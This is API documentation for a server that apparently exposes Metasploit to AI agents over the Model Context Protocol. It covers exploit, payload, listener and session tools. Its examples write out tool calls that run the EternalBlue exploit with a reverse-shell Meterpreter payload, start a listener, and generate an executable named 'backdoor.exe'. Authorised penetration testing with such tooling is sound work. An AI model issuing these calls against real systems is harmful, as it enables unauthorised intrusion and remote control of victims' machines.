# API Documentation

This document describes the MCP tools provided by the Metasploit MCP Server.

## Overview

The Metasploit MCP Server provides access to core Metasploit functionality through the Model Context Protocol (MCP). All tools are available via HTTP POST requests to the `/mcp` endpoint when running in HTTP transport mode.

## Base URL

When running locally with default settings:
```
http://127.0.0.1:8085/mcp
```

## Available Tools

### Exploit Management

#### `list_exploits`
List available Metasploit exploit modules with optional filtering.

**Parameters:**
- `platform_filter` (optional, string): Filter by platform (e.g., "windows", "linux")
- `search_term` (optional, string): Search term to filter exploits

**Returns:**
- `status`: "success" or "error"
- `exploits`: Array of exploit module information
- `count`: Number of exploits returned

#### `run_exploit`
Execute a Metasploit exploit module.

**Parameters:**
- `module_name` (string): Exploit module name (e.g., "windows/smb/ms17_010_eternalblue")
- `options` (dict/string): Module options (e.g., {"RHOSTS": "192.168.1.100"})
- `payload_name` (optional, string): Payload to use
- `payload_options` (optional, dict/string): Payload-specific options
- `run_as_job` (optional, bool): Run as background job (default: false)
- `check_vulnerability` (optional, bool): Check if target is vulnerable first (default: false)
- `timeout_seconds` (optional, int): Timeout for exploit execution (default: 60)

**Returns:**
- `status`: "success", "warning", or "error"
- `message`: Human-readable result message
- `session_id_detected`: Session ID if successful
- `module_output`: Raw Metasploit output

### Payload Management

#### `list_payloads`
List available Metasploit payload modules with optional filtering.

**Parameters:**
- `platform_filter` (optional, string): Filter by platform
- `arch_filter` (optional, string): Filter by architecture

**Returns:**
- `status`: "success" or "error"
- `payloads`: Array of payload module information
- `count`: Number of payloads returned

#### `generate_payload`
Generate a Metasploit payload.

**Parameters:**
- `payload_type` (string): Payload type (e.g., "windows/meterpreter/reverse_tcp")
- `format_type` (string): Output format ("raw", "exe", "python", etc.)
- `options` (dict/string): Payload options (e.g., {"LHOST": "192.168.1.100", "LPORT": 4444})
- `encoder` (optional, string): Encoder to use
- `iterations` (optional, int): Encoding iterations
- `bad_chars` (optional, string): Bad characters to avoid
- `output_filename` (optional, string): Desired filename
- `reverse_listener_bind_address` (optional, string): Bind address (defaults to 0.0.0.0)
- `reverse_listener_bind_port` (optional, int): Bind port (defaults to LPORT)

**Returns:**
- `status`: "success" or "error"
- `message`: Result message
- `payload_size`: Size of generated payload
- `server_save_path`: Path where payload was saved on server

### Session Management

#### `list_active_sessions`
List all active Metasploit sessions.

**Returns:**
- `status`: "success" or "error"
- `sessions`: Dictionary of active sessions
- `session_count`: Number of active sessions

#### `send_session_command`
Send a command to an active session.

**Parameters:**
- `session_id` (int): Session ID to send command to
- `command` (string): Command to execute
- `timeout_seconds` (optional, int): Command timeout (default: 60)

**Returns:**
- `status`: "success", "warning", or "error"
- `output`: Command output
- `session_type`: Type of session (meterpreter, shell, etc.)

#### `terminate_session`
Terminate an active session.

**Parameters:**
- `session_id` (int): Session ID to terminate

**Returns:**
- `status`: "success" or "error"
- `message`: Result message

### Listener Management

#### `start_listener`
Start a new Metasploit handler (listener) as a background job.

**Parameters:**
- `payload_type` (string): Payload to handle (e.g., "windows/meterpreter/reverse_tcp")
- `lhost` (string): Listener host address (what target connects to)
- `lport` (int): Listener port (1-65535)
- `additional_options` (optional, dict/string): Additional payload options
- `exit_on_session` (optional, bool): Exit handler after first session (default: false)
- `reverse_listener_bind_address` (optional, string): Bind address (defaults to 0.0.0.0)
- `reverse_listener_bind_port` (optional, int): Bind port (defaults to lport)

**Returns:**
- `status`: "success" or "error"
- `message`: Result message with job ID
- `job_id`: Background job ID

#### `list_listeners`
List active handlers and other background jobs.

**Returns:**
- `status`: "success" or "error"
- `handlers`: Dictionary of active handlers
- `other_jobs`: Dictionary of other background jobs
- `handler_count`: Number of active handlers
- `total_job_count`: Total number of background jobs

#### `stop_job`
Stop a background job (including handlers).

**Parameters:**
- `job_id` (string): Job ID to stop

**Returns:**
- `status`: "success" or "error"
- `message`: Result message

### Utility Tools

#### `health_check`
Check server health and Metasploit connectivity.

**Returns:**
- `status`: "healthy" or "unhealthy"
- `metasploit_connected`: Boolean indicating Metasploit connection status
- `version`: Metasploit version if connected

## Error Handling

All tools return a consistent error format:

```json
{
  "status": "error",
  "message": "Human-readable error description"
}
```

Common error scenarios:
- Invalid parameters
- Metasploit RPC connection issues
- Module not found
- Session/job not found
- Timeout errors
- Permission errors

## Examples

### Starting a Listener

```json
{
  "tool": "start_listener",
  "arguments": {
    "payload_type": "windows/meterpreter/reverse_tcp",
    "lhost": "192.168.1.100",
    "lport": 4444,
    "reverse_listener_bind_address": "0.0.0.0"
  }
}
```

### Running an Exploit

```json
{
  "tool": "run_exploit",
  "arguments": {
    "module_name": "windows/smb/ms17_010_eternalblue",
    "options": {
      "RHOSTS": "192.168.1.50",
      "RPORT": 445
    },
    "payload_name": "windows/x64/meterpreter/reverse_tcp",
    "payload_options": {
      "LHOST": "192.168.1.100",
      "LPORT": 4444
    },
    "check_vulnerability": true
  }
}
```

### Generating a Payload

```json
{
  "tool": "generate_payload",
  "arguments": {
    "payload_type": "windows/meterpreter/reverse_tcp",
    "format_type": "exe",
    "options": {
      "LHOST": "192.168.1.100",
      "LPORT": 4444
    },
    "output_filename": "backdoor.exe"
  }
}
```

## Security Considerations

- The server requires authentication to the Metasploit RPC service
- Generated payloads are saved to a configured directory on the server
- All network operations respect the configured bind address validation
- Session commands have configurable timeouts to prevent hanging
- The server validates all input parameters before passing to Metasploit

## Rate Limiting

Currently, no rate limiting is implemented. Consider implementing rate limiting in production environments to prevent abuse.

## Logging

All operations are logged with appropriate levels:
- INFO: Normal operations, connections, tool usage
- WARNING: Non-fatal errors, timeouts, validation failures  
- ERROR: Fatal errors, connection failures, unexpected exceptions
- DEBUG: Detailed operation traces (enable with LOG_LEVEL=DEBUG)
